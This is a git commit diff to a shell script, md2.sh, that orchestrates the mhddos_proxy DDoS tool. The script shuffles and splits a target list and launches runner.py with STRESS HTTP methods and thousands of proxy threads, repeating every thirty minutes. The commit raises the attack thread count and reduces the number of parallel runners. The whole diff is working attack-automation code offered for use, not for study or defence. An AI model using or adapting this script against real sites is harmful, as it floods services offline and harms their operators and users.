381f48c696097f1dae6b7d3145beb51fb437d274
Kali <darkwing42@gmail.com>
2022-05-16 05:22:56 -0400

    update

--- md2.sh
+++ md2.sh
@@ -34,7 +34,7 @@ if [[ $docker_mode != "true" ]]; then
 fi
 
 if [[ $t_set_manual != "on" ]]; then
-    export threads="-t 200"
+    export threads="-t 500"
 fi
 export proxy_threads="2000"
 export methods="--http-methods GET STRESS"
@@ -71,7 +71,7 @@ cat $targets_line_by_line | sort | uniq | sort -R > $targets_uniq
 
 #split targets by line in N files
 cd /var/tmp/
-split -n l/4 --additional-suffix=.uaripper $targets_uniq
+split -n l/2 --additional-suffix=.uaripper $targets_uniq
 cd -
 
 # Print greetings and number of targets (secondary, main, total)
@@ -202,10 +202,10 @@ echo "threads: "$threads; echo "methods: "$methods
         python3 ~/multidd/mhddos_proxy/runner.py -c $t1 $threads $methods&
         sleep 10 # to decrease load on cpu during simultaneous start
         python3 ~/multidd/mhddos_proxy/runner.py -c $t2 $threads $methods&
-        sleep 10 # to decrease load on cpu during simultaneous start
-        python3 ~/multidd/mhddos_proxy/runner.py -c $t3 $threads $methods&
-        sleep 10 # to decrease load on cpu during simultaneous start
-        python3 ~/multidd/mhddos_proxy/runner.py -c $t4 $threads $methods&
+        # sleep 10 # to decrease load on cpu during simultaneous start
+        # python3 ~/multidd/mhddos_proxy/runner.py -c $t3 $threads $methods&
+        # sleep 10 # to decrease load on cpu during simultaneous start
+        # python3 ~/multidd/mhddos_proxy/runner.py -c $t4 $threads $methods&
 sleep 30m
 prepare_targets_and_banner
 done
